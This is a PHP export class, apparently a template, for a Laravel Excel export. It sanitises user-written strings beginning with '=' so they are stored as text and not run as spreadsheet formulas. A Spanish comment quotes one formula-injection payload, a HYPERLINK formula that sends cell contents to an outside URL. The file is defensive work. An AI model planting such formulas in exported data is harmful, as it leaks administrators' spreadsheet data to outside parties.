<?php

namespace Namespace\Exports;

use Namespace\Models\PascalCaseModelName;
use Innoboxrr\SearchSurge\Search\Builder;
use Illuminate\Contracts\View\View;
use Maatwebsite\Excel\Concerns\FromView;
use Maatwebsite\Excel\Concerns\WithCustomValueBinder;
use PhpOffice\PhpSpreadsheet\Cell\Cell;
use PhpOffice\PhpSpreadsheet\Cell\DataType;
use PhpOffice\PhpSpreadsheet\Cell\DefaultValueBinder;

class PluralPascalCaseModelNameExports extends DefaultValueBinder implements FromView, WithCustomValueBinder
{

    public function __construct(protected array $data)
    {
    }

    public function view(): View
    {
        return view(
            config(
                'larapackConfigKey.excel_view', 
                'excelViewPrefix'
            ) . 'snake_case_model_name', 
            [
                'plural_snake_case_model_name' => $this->getQuery(),
                'exportCols' => PascalCaseModelName::$export_cols
            ]
        );
    }

    public function getQuery()
    {   
        $builder = new Builder();
        // lazy() en vez de get(): un export recorre la tabla entera y
        // hidratar todas las filas a la vez es lo que revienta la memoria.
        return $builder->lazy(PascalCaseModelName::class, $this->data);
    }

    /**
     * Lo que empieza por `=` se guarda como texto, no como fórmula.
     *
     * PhpSpreadsheet convierte en fórmula cualquier celda que empiece por `=`,
     * y lo que se exporta lo escribieron los usuarios. Quien guardara un título
     * como `=HYPERLINK("https://..."&B2;"Ver")` dejaba en el archivo que abre
     * el administrador un enlace que se lleva el contenido de otras celdas. El
     * resto de valores se tipa como siempre: los números siguen siendo números.
     */
    public function bindValue(Cell $cell, mixed $value): bool
    {
        if (is_string($value) && str_starts_with($value, '=')) {
            $cell->setValueExplicit($value, DataType::TYPE_STRING);

            return true;
        }

        return parent::bindValue($cell, $value);
    }

}
